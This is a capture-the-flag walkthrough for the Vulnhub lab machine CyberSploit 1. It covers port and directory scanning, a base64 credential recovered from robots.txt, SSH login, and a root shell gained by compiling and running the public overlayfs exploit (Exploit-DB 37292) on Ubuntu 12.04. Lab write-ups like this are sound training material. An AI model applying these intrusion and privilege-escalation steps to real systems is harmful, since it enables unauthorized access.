OG Vulnhub box: https://www.vulnhub.com/entry/cybersploit-1,506/

Since target was given I don't have to run netdiscover to find target:

Target is: 192.168.52.92

$ nmap 192.168.52.92 -p- -sV

Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-20 17:07 EDT

Nmap scan report for 192.168.52.92

Host is up (0.0013s latency).

Not shown: 65533 closed tcp ports (conn-refused)

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 9.31 seconds

  

Check firefox on 80

![](https://lh4.googleusercontent.com/RAQ87dgfPasHGo6vxerZ_7ZOCrxCmZFDjNs0uuRKMswkOEjSvnaaQTVErXV0auuL8bKozxJQXUI3IVFlC_Jq_8rxRFSu9ihCm9ZCC-95B8TRXy9ok0LLw8vXpAn7Ofi4Kw=w1280)

This image shows up. Time to check directories and subdirectories. Time to run dirb and subdirwith the former for directories(website.com/page1) and latter for subdirectories such as app.website.com

???(kali?kali)-[~]

??$ dirb http://192.168.52.92  

  

-----------------

DIRB v2.22    

By The Dark Raver

-----------------

  

START_TIME: Thu Apr 20 21:19:08 2023

URL_BASE: http://192.168.52.92/

WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

  

-----------------

  

                                                                    GENERATED WORDS: 4612

  

---- Scanning URL: http://192.168.52.92/ ----

                                                                    + http://192.168.52.92/cgi-bin/ (CODE:403|SIZE:289)                

+ http://192.168.52.92/hacker (CODE:200|SIZE:3757743)              

+ http://192.168.52.92/index (CODE:200|SIZE:2333)                  

+ http://192.168.52.92/index.html (CODE:200|SIZE:2333)             

+ http://192.168.52.92/robots (CODE:200|SIZE:53)                   

+ http://192.168.52.92/robots.txt (CODE:200|SIZE:53)               

+ http://192.168.52.92/server-status (CODE:403|SIZE:294)           

-----------------

END_TIME: Thu Apr 20 21:19:12 2023

DOWNLOADED: 4612 - FOUND: 7

Saw robots.txt so going there and I find a base64 looking string

Y3liZXJzcGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0=

  

AI decoding with cyberchef verification yields

  

The text you provided appears to be a Base64 encoded string. Let me decode it for you:

"Y3liZXJzcGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0="

Decoded result: "cybersploit{youtube.com/c/cybersploit}"

It seems to be a URL for a YouTube channel named "cybersploit".

Checking page source code also nets the user itsskv

Try logging into ssh now with the username and the base64 password

![](https://lh6.googleusercontent.com/KkuY7amvTng0a6U2b36J4A_eXkrFpI140y2BQ-x7utVcL1Jy8xk2-uDSMIpDqumNskcg4qLTok_wsfTX4O3Y1ZSc-RXz1ki4eW12W-3by5yb3JwYyXUM6PFxFUY_wjATGg=w1280)

ls in . and see flag2.txt but after a cat the flag is another file. Checking out local.txt I find a string of text which I submit as the flag and get the first 50%.

  

Now for root.

Checking the OS version first

itsskv@cybersploit-CTF:~$ uname -a

Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 athlon i386 GNU/Linux

itsskv@cybersploit-CTF:~$ cat /etc/issue

Ubuntu 12.04.5 LTS \n \l

  

itsskv@cybersploit-CTF:~$ 

Now to check for local exploits on Ubuntu 12.04.5 LTS on exploitdb

![](https://lh3.googleusercontent.com/cI1DAjViRVQLfc6UHkRwNb82Ed6rfh4b9hYjC4J0ouiY6emR_1w61o3ArNJixAHqazKacOao3Ul6oPCsn5eThDfYDmviDjDiyW8q8ej6lgYCe1pGNu9xkMV0UVAer7Tutg=w1280)

[https://www.exploit-db.com/exploits/37292](https://www.exploit-db.com/exploits/37292)

Now downloading one of the exploits for local. Will use the overlayFS one as it's the "latest" one

???(kali?kali)-[~]

??$ scp 37292.c itsskv@192.168.52.92:/home/itsskv

itsskv@192.168.52.92's password: 

37292.c  

Now the c exploit is on the target machine for a local privesc

itsskv@cybersploit-CTF:~$ ls

37292.c    Downloads         local.txt  Public

Desktop    examples.desktop  Music      Templates

Documents  flag2.txt         Pictures   Videos

itsskv@cybersploit-CTF:~$ 

Now time to compile the c code then run the program

itsskv@cybersploit-CTF:~$ gcc 37292.c 

itsskv@cybersploit-CTF:~$ ./a.out 

spawning threads

mount #1

mount #2

child threads done

/etc/ld.so.preload created

creating shared library

# whoami

root

# 

cool.

Opportunity to upgrade shell to a more stable one here. Use shell upgrade commands.

Now to look through root's files

# ls

37292.c    Downloads  Public     a.out             local.txt

Desktop    Music      Templates  examples.desktop

Documents  Pictures   Videos     flag2.txt

# cd /

# ls

bin    home            media  run      tmp

boot   initrd.img      mnt    sbin     usr

cdrom  initrd.img.old  opt    selinux  var

dev    lib             proc   srv      vmlinuz

etc    lost+found      root   sys      vmlinuz.old

# cd root

# ls

Desktop    Downloads  Pictures  Templates  finalflag.txt

Documents  Music      Public    Videos     proof.txt

# cat finalflag.txt

Your flag is in another file...

# cat proof.txt

f2cb93ee2456de2ec462b74e2f5620b8

And Boot2Root 🐱‍💻